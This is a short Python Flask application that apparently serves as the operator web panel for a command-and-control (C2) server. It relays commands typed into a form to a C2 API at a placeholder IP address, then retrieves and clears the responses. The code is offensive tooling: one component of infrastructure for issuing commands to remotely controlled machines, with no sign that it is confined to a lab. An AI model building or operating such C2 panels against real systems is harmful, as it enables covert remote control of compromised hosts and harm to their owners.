from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

C2_SERVER_URL = "http://<YOUR IP: LOCAL OR EXTERNAL IP OF CLOUD VM>:5001"  # URL of c2_server API

@app.route('/')
def home():
    return render_template("index.html")

@app.route('/send_command', methods=['POST'])
def send_command():
    command = request.form.get("command")

    if not command:
        return jsonify({"error": "No command entered"}), 400

    response = requests.post(f"{C2_SERVER_URL}/send_command", json={"command": command})
    return response.json()

@app.route('/get_responses', methods=['GET'])
def get_responses():
    response = requests.get(f"{C2_SERVER_URL}/get_responses")
    return response.json()

@app.route('/clear_responses', methods=['POST'])
def clear_responses():
    response = requests.post(f"{C2_SERVER_URL}/clear_responses")
    return response.json()


if __name__ == '__main__':
    app.run(debug=True, port=5000)
